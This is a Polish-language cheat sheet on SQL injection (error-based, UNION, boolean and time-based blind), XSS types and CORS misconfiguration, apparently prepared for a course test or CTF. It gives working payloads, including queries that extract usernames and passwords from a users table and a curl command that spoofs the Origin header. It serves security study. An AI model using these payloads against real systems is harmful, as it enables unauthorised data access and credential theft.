# Ściągawka: SQLi, XSS, CORS

---

## 1. SQL Injection – In-band (Classic SQLi)

### 1.1 Error-based SQLi

**Co to:** Błędy bazy danych wyświetlane przez aplikację są wykorzystywane do wyciągania danych.

**Jak rozpoznać:**
- Wstaw `'` (apostrof) w każde pole/parametr i obserwuj, czy pojawia się błąd SQL na ekranie.

**Przykładowe payloady (MySQL/MariaDB):**
```
'
```
```
' AND extractvalue(1, concat(0x7e, (SELECT version()))) -- 
```
```
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x 
FROM information_schema.tables GROUP BY x) a) -- 
```

**Tip:** Funkcje takie jak `extractvalue()` i `xpath_eval()` wymuszają błąd zawierający fragment wyniku zapytania — czytasz dane wprost z treści błędu.

---

### 1.2 Union-based SQLi

**Co to:** Doklejenie własnego `SELECT` do oryginalnego zapytania za pomocą `UNION`, żeby wyświetlić dane z innej tabeli.

**Kroki:**
1. Ustal liczbę kolumn:
   ```
   1 ORDER BY 1 -- 
   1 ORDER BY 2 -- 
   ...
   ```
   Zwiększaj numer, aż dostaniesz błąd → ostatnia działająca liczba = liczba kolumn.
   Alternatywnie:
   ```
   -1 UNION SELECT NULL,NULL,NULL -- 
   ```
   (dopasuj liczbę NULL-i, aż zapytanie przejdzie bez błędu).

2. Ustal, które kolumny są widoczne na stronie:
   ```
   -1 UNION SELECT 1,2,3 -- 
   ```
   Sprawdź, gdzie na stronie pojawiają się liczby 1, 2, 3.

3. Wyciągnij realne dane w widocznych kolumnach:
   ```
   -1 UNION SELECT username, password, NULL FROM users -- 
   ```

4. Jeśli nie znasz nazw tabel/kolumn – najpierw zapytaj `information_schema`:
   ```
   -1 UNION SELECT table_name, NULL, NULL FROM information_schema.tables 
   WHERE table_schema=database() -- 
   ```
   ```
   -1 UNION SELECT column_name, NULL, NULL FROM information_schema.columns 
   WHERE table_name='users' -- 
   ```

**Tip:** `id=-1` lub `id=9999` jako pierwszy parametr gwarantuje, że oryginalne zapytanie nie zwróci wiersza i nie "zasłoni" Twojego UNION-a.

---

## 2. SQL Injection – Inferential (Blind SQLi)

### 2.1 Boolean-based Blind SQLi

**Co to:** Brak błędów i brak widocznych danych — jedyny sygnał to **różnica w zachowaniu strony** (np. "znaleziono" vs "nie znaleziono").

**Test bazowy (para kontrastowa):**
```
' AND 1=1 -- 
' AND 1=2 -- 
```
Jeśli strona zachowuje się różnie dla tych dwóch payloadów → podatność potwierdzona.

**Wyciąganie danych znak po znaku:**
```
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- 
```
Zmieniaj pozycję (`,1,1` → `,2,1` ...) i porównywany znak, aż trafisz właściwy — odczytujesz całe hasło bit po bicie, obserwując zmianę zachowania strony.

**Tip:** Możesz też używać `ASCII()` do binarnego przeszukiwania znaków (szybsze niż sprawdzanie liter po kolei):
```
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100 -- 
```

---

### 2.2 Time-based Blind SQLi

**Co to:** Brak jakiejkolwiek różnicy w treści odpowiedzi — jedyny dostępny kanał to **czas odpowiedzi serwera**.

**Test bazowy:**
```
' OR SLEEP(3) -- 
```
Jeśli odpowiedź przychodzi z opóźnieniem ~3s → wstrzyknięcie działa.

**Warunkowe opóźnienie:**
```
' AND IF(1=1, SLEEP(3), 0) -- 
```
Zamień `1=1` na realny warunek, który chcesz sprawdzić:
```
' AND IF((SELECT has_insurance FROM shipments WHERE order_id='X')=1, SLEEP(3), 0) -- 
```
```
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(3), 0) -- 
```

**Tip:** Nie ustawiaj zbyt długiego SLEEP (np. 10s+) — wydłuża to test wielokrotnie i może wywołać timeout aplikacji. 2–3 sekundy zwykle wystarczą do jednoznacznej obserwacji.

---

## 3. XSS (Cross-Site Scripting)

**Ogólna metoda testowania (niezależnie od typu):**
1. Znajdź miejsce, gdzie Twój input jest odzwierciedlany w HTML-u (pole wyszukiwania, komentarz, parametr URL, profil).
2. Wstrzyknij testowy payload i sprawdź kod źródłowy (Ctrl+U / DevTools), czy znaki `<`, `>`, `"` zostały zakodowane (encoded) czy nie.
3. Zwróć uwagę na **kontekst** wstrzyknięcia — to determinuje, jaki payload zadziała.

**Podstawowe payloady testowe:**
```html
<script>alert(1)</script>
```
```html
"><img src=x onerror=alert(1)>
```
```html
'><svg onload=alert(1)>
```
Jeśli jesteś w atrybucie HTML, najpierw zamknij go:
```html
" onmouseover="alert(1)
```
Jeśli filtruje `<script>`, próbuj innych tagów wywołujących JS:
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
```

### 3.1 Stored (Persistent) XSS
- Payload zapisuje się trwale w bazie danych (np. komentarz, post, opis profilu).
- Wykonuje się **dla każdego**, kto później wyświetli tę stronę/treść.
- Najbardziej niebezpieczny typ — nie wymaga interakcji ofiary z linkiem.

### 3.2 Reflected XSS
- Payload znajduje się w samym żądaniu (najczęściej w parametrze URL) i jest natychmiast odsyłany w odpowiedzi.
- Nie jest zapisywany na trwałe — wymaga, żeby ofiara kliknęła spreparowany link.
- Przykład: `http://strona.pl/szukaj?q=<script>alert(1)</script>`

### 3.3 DOM-based XSS
- Payload nie jest (albo nie musi być) wysyłany do serwera — przetwarza go kod JavaScript działający w przeglądarce.
- Typowe źródła: `location.hash`, `location.search`, `document.URL`, `document.referrer`.
- Typowe "ujścia" (sinks): `innerHTML`, `document.write()`, `eval()`.
- Sprawdzasz to analizując kod JS strony, nie odpowiedź serwera (response może nie zawierać payloadu wcale).
- Przykład: `http://strona.pl/page#<img src=x onerror=alert(1)>` — jeśli skrypt na stronie czyta `location.hash` i wstawia go przez `innerHTML`.

---

## 4. CORS (Cross-Origin Resource Sharing)

**Jak to działa:**
- CORS to mechanizm wymuszany przez **przeglądarkę**, nie przez serwer sam z siebie.
- Przeglądarka wysyła nagłówek `Origin` przy żądaniu cross-origin.
- Serwer w odpowiedzi deklaruje nagłówek `Access-Control-Allow-Origin`, który mówi, jakie domeny mogą odczytać tę odpowiedź w JS.
- Jeśli `Access-Control-Allow-Origin` nie zgadza się z domeną strony wywołującej → **przeglądarka blokuje odczyt odpowiedzi przez JS** (samo żądanie zwykle i tak dochodzi do serwera).

**Typowe błędy konfiguracji do szukania:**
- Serwer **odzwierciedla** wartość `Origin` z żądania zamiast porównywać ją z whitelistą (akceptuje dowolną domenę).
- Serwer akceptuje `Origin: null`.
- `Access-Control-Allow-Credentials: true` w połączeniu z dowolnym/odzwierciedlonym originem — bardzo niebezpieczna kombinacja (umożliwia kradzież danych razem z cookies/sesją).
- Słabe dopasowanie regexem (np. akceptuje każdą domenę zawierającą `kolokwium.local`, w tym `kolokwium.local.atakujacy.pl`).

**Jak testować/obchodzić:**
- Użyj Postmana lub curl — te narzędzia **nie respektują CORS** (to ograniczenie przeglądarki, nie protokołu HTTP).
- Ręcznie ustaw nagłówek `Origin` na wartość, której wymaga serwer:
  ```
  curl -H "Origin: http://kolokwium.local" "http://target/api?get_flag"
  ```
- W Postmanie: zakładka *Headers* → dodaj klucz `Origin`, wartość np. `http://kolokwium.local` → Send.
- Sprawdź odpowiedź — jeśli serwer tylko sprawdza nagłówek `Origin` (a nie np. tokenu CSRF), dostaniesz dane mimo że nie jesteś na tej domenie.

**Wniosek:** Samo sprawdzanie nagłówka `Origin` po stronie serwera nie jest realnym zabezpieczeniem, bo nagłówek ten jest w pełni kontrolowany przez klienta poza środowiskiem przeglądarki.
